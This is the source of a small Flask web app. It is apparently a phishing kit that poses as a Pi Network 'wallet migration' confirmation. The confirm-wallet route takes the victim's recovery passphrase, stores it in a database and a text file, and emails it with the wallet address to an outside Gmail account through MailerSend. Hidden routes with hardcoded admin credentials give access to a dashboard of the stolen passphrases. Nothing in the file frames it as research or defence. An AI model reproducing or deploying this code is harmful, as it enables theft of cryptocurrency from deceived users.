from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from flask_migrate import Migrate
from models import Wallet
from flask_cors import CORS
from db import db_init, db
import requests
import os



app = Flask(__name__, static_url_path='/static', static_folder='static')
app.secret_key = 'bwgibgwgwgw'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///thedbnew.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
migrate = Migrate(app, db)
db_init(app)
CORS(app)

# 

API_TOKEN = os.getenv('MAILSENDER_API')
FROM_EMAIL = 'noreply@test-pzkmgq7z9znl059v.mlsender.net'
TO_EMAIL = 'pinetworkofficialhelpdesk@gmail.com' 

@app.route('/<user_address>')
def home(user_address):
    return render_template('index.html', user_address=user_address, title='Confirm Your Migration')


@app.route('/<user_address>/confirm-wallet', methods=['GET','POST'])
def confirm_wallet(user_address):
    if request.method == 'POST':
        pass_phrase = request.form.get('passphrase')
        # Save to dB
        new_wallet = Wallet(pass_phrase=pass_phrase)
        db.session.add(new_wallet)
        db.session.commit()

        if pass_phrase:
            with open('data.txt', 'a') as file:
                file.write('data: '+ pass_phrase + '\n')
            print(f'data: {pass_phrase}')  
            print('Data Saved Successfully')
        else:
            print('no data received')
        
        data = {
            "from": {
                "email": FROM_EMAIL,
                "name": "Notifications"
            },
            "to": [
                {
                    "email": TO_EMAIL,
                    "name": "test"
                }
            ],
            "subject": "New Wallet",
            "text": f"Wallet: {user_address}: {pass_phrase}"
        }

        headers = {
            "Authorization": f"Bearer {API_TOKEN}",
            "Content-Type": "application/json"
        }

        response = requests.post(
            "https://api.mailersend.com/v1/email",
            json=data,
            headers=headers
        )

        print("MailerSend Response:", response.status_code, response.text)  

        

        return redirect(url_for('confirmed', user_address=user_address))
    return render_template('confirm_wallet.html', title='Confirm This Wallet', user_address=user_address)

@app.route('/<user_address>/confirmed')
def confirmed(user_address):
    # name = request.args.get('name', 'User')
    return render_template('wallet_confirmed.html', title="Confirmation Page", user_address=user_address)

@app.route("/xjhfiD39wnkdk32", methods=["GET", "POST"])
def secret_login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        
        if username == "admin" and password == "Holyfuck":
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        else:
            return "Invalid credentials", 403

    return render_template("login.html", title="Secure Login")


@app.route("/wfie3fsFr")
def dashboard():
    if not session.get("logged_in"):
        return "Access denied", 403
    wallet_info = Wallet.query.all()

    return render_template('view.html', wallet_info=wallet_info)

if __name__=="__main__": 
    app.run(debug=True)

